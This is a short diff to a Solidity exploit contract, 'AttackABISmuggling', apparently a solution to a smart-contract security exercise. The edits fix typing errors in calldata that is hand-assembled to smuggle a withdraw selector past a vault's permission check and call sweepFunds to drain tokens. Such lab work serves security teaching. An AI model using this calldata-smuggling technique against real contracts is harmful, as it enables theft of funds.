@@ -103,10 +103,10 @@ contract AttackABISmuggling {
         bytes4 executeSelector = vault.execute.selector;
         bytes memory target = abi.encodePacked(bytes12(0), address(vault));
         bytes memory dataOffset = abi.encodePacked(uint256(0x00));
-        bytes memory emtyData = abi.encodePacked(uint245(0));
+        bytes memory emtyData = abi.encodePacked(uint256(0));
         bytes memory withdrawSelectorPadded = abi.encodePacked(
             bytes4(0xd9caed12),
-            bytes(0)
+            bytes28(0)
         );
         
         bytes memory sweepFundsCalldata = abi.encodeWithSelector(
@@ -115,6 +115,6 @@ contract AttackABISmuggling {
             token
         );
 
-        
+
     }
 }
